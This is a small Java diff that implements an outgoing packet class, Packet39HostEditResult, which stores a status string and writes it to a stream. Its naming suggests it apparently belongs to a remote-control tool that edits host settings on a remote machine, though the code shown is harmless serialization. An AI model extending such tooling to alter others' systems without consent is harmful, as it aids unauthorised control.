@@ -6,14 +6,15 @@ import com.redpois0n.common.io.StringWriter;
 
 public class Packet39HostEditResult extends AbstractOutgoingPacket {
 
-	public Packet39HostEditResult(String string) {
-		// TODO Auto-generated constructor stub
+	private String status;
+	
+	public Packet39HostEditResult(String status) {
+		this.status = status;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		// TODO Auto-generated method stub
-
+		sw.writeLine(status);
 	}
 
 	@Override
